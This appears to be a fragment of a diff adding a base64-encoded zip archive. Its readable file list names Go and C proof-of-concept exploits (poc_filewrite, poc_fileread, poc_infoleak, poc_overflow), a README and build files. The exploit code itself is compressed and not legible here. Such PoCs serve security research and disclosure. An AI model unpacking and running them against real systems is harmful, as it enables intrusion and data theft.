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
+BAAAomkAAAAA
